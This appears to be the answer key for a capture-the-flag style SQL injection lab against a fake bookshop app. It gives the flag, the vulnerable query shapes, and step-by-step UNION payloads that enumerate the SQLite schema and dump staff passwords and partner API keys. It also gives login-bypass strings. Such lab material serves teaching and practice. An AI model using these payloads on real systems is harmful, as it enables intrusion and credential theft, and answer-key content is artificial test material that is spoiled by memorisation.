# BookNook (`/books`)

- **Difficulty:** Easy
- **Engine:** SQLite 3 (file `lab/data/booknook.db`)
- **Flag:** `FLAG{booknook_paper_lantern_ledger}` in table `partner_keys`, column `api_key`
- **Injection points:** (1) catalogue search `q`, (2) staff login `username` and `password`

## Discovery

- Home page has a search box -> `/books/catalogue?q=...`. Submitting a single quote returns a visible SQLite syntax error (`Search failed: near ...`). That confirms string-context injection.
- Footer link "Staff login" -> `/books/staff/login`. A quote in the username returns `Sign in failed: ...` with the error text.

## 1. Catalogue search (UNION, string context)

Query shape: `SELECT id, title, author, category, price FROM books WHERE title LIKE '%q%' OR author LIKE '%q%'`

1. Column count: `zzz' ORDER BY 5--` works, `ORDER BY 6--` errors. Result: 5 columns. (Or probe with `UNION SELECT 1,2,3,4,5--`.)
2. Reflected columns: 2, 3, 4 and 5 are printed in the table (column 1 only forms the link).
3. Version: `zzz' UNION SELECT 1,sqlite_version(),3,4,5--`
4. Tables: `zzz' UNION SELECT 1,group_concat(name),3,4,5 FROM sqlite_master WHERE type='table'--`
   Tables: books, customers, orders, reviews, staff, legacy_staff, coupons, partner_keys, subscribers, messages
5. Columns: `zzz' UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info('partner_keys')--`
   (or `SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='partner_keys'--`)
6. Rows / flag: `zzz' UNION SELECT 1,partner,api_key,4,5 FROM partner_keys--`
   Credentials: `zzz' UNION SELECT 1,username,password,4,5 FROM staff--`

## 2. Staff login (authentication bypass + UNION)

Query shape: `SELECT id, username, fullname, role FROM staff WHERE username = '<u>' AND password = '<p>'`

- Bypass: username `admin'--` (any password), or `' OR 1=1--`. Logs in as the first row (the admin account).
- The dashboard prints "Signed in as <fullname> (<role>)" using the 3rd and 4th selected columns, so UNION works here too:
  - Username `x' UNION SELECT 1,2,sqlite_version(),4--` -> version appears in the banner.
  - `x' UNION SELECT 1,2,(SELECT group_concat(name) FROM sqlite_master WHERE type='table'),4--` -> tables.
  - `x' UNION SELECT 1,2,(SELECT group_concat(name) FROM pragma_table_info('partner_keys')),4--` -> columns.
  - `x' UNION SELECT 1,2,(SELECT group_concat(api_key) FROM partner_keys),4--` -> flag.
- Stacked queries are not possible (Python's sqlite3 refuses them).

## Rabbit holes (all safe)

1. `/books/book?id=` : looks like the classic numeric id, but it is validated as digits and the query is parameterised. A quote just gives "could not be found".
2. `/books/catalogue?category=` and `?sort=` : category is a bound parameter; `sort` is a whitelist lookup. Quotes give "No titles matched" / are ignored.
3. `/books/staff/orders?status=` (after login) : parameterised filter.
4. `/books/staff/backup` and `/books/backup`, `/books/admin` : the backup page lists archives whose download always returns 404 "Archive unavailable"; `/books/backup` is a 403; `/books/admin` redirects to the login.
5. Newsletter and contact forms : parameterised INSERTs.
6. Decoy tables: `legacy_staff` (old logins that do not work), `coupons` (fake codes).
